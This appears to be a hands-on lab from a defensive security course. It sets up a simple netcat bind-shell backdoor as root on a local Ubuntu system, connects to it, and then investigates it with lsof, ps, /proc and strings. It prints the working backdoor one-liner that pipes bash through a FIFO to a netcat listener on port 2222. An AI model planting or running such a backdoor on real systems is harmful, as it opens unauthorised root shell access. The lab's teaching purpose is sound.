
# Linux CLI

In this lab we will be looking at a backdoor through the lens of the Linux CLI.

We will be using a large number of different basic commands to get a better understanding of what the backdoor is and what it does.

For this lab we will be running three different Ubuntu terminals.

The first will be where we run the backdoor.

The second will be where we connect to it.

The third is where we will be running our analysis.

Let’s get started by opening a Terminal as Administrator


![](attachments/Clipboard_2020-06-12-10-36-44.png)

When you get the User Account Control Prompt, select Yes.

And, open a Ubuntu command prompt:

![](attachments/Clipboard_2020-06-17-08-32-51.png)

On your Linux terminal, please run the following command:

$`sudo su -`

The password is adhd.


This will get us to a root prompt. We want to do this because we want to have a backdoor running as root and a connection from a different user account on the system.

We will next need to create a fifo backpipe:

/#`mknod backpipe p`

Next, let's start the backdoor:

/#`/bin/bash  0<backpipe | nc -l 2222 1>backpipe`

In the above command we are creating a netcat listener that forwards all input through a backpipe and then into a bash session.  It then takes the output of the bash session and puts it back into the netcat listener. 

Basicly, this will create a backdoor listening on port 2222 of our linux system.

Now, let's open another Ubuntu terminal.  This will be the terminal we connect to the above created backdoor with.

![](attachments/Clipboard_2020-06-17-08-32-51.png)

Now we will need to know the IP address of our linux system:

$`ifconfig`

![](attachments/Clipboard_2020-12-11-07-18-27.png)

Now, let's connect:

$` nc 172.30.249.49 2222`

Remember!!!  Your IP address will be different!!!!

Now, let's type some commands and make sure it is working

`ls`
`whoami`

![](attachments/Clipboard_2020-12-11-07-19-48.png)

As you can see, we are connected to the simple Linux backdoor as root.  Also notice there was not message saying we succesfully connected to the backdoor.  It just drops our curser back to the left side of the screen.

Now, let's open yet another Ubuntu terminal and start our analysis. This means we have one where we created the backdoor, another that connected to it and this third one will be for the analysis.

![](attachments/Clipboard_2020-06-17-08-32-51.png)

On your Linux terminal, please run the following command:

$`sudo su -`

This will get us to a root prompt.   We want to be root because looking at network connections and process information systemwide requires root access.  Basicly, it is very hard to do your job as a SOC pro without root or admin rights.

Let's start by looking at the network connections with lsof.  When we use lsof, we are looking at open files.  When we use the -i flag we are looking at the open Internet connections.  When we use the -P flag we are telling lsof to not try and guess what the service is on the ports that are being used. Just give us the port number.

/#`lsof -i -P`


![](attachments/Clipboard_2020-12-11-07-23-35.png)

Now let's dig into the netcat process ID.  We can do this with the lowercase p switch.  This will give us all the open files associated with the listed process ID.

/#`lsof -p 131`

![](attachments/Clipboard_2020-12-11-07-24-11.png)

Let's look at the full processes.  We can do this with the ps command. We are also adding the aux switches.  This is a for all processes,  u for sorted by user and x to include the processes using a teletype terminal.

/#`ps aux`

![](attachments/Clipboard_2020-12-11-07-24-39.png)

Let's change directories into the proc directory for that pid.  Remember, proc is a directory that does not exist on the drive.  It allows us to see data associated with the various processes directly.   This can be very usesfull as it allows us to dig into the memory of a process that is currently running on a suspect system.

/#`cd /proc/[pid]`

![](attachments/Clipboard_2020-12-11-07-25-14.png)

We can see a number of interesting directories here:

/#`ls`

![](attachments/Clipboard_2020-12-11-07-28-21.png)

Remember!!!  Your PID will be different!!!

We can run strings on the exe in this directory.  This is very, very useful as when programs are created there may be usage information, mentions of system libraries and possible code comments.  We use this all the time to attempt to identify what exactly a program is doing.

/#`strings ./exe`

![](attachments/Clipboard_2020-12-11-07-25-54.png)

If we scroll down, we can see the actual usage information for netcat.  We pulled it direcly out of memory!

![](attachments/Clipboard_2020-12-11-07-27-29.png)

















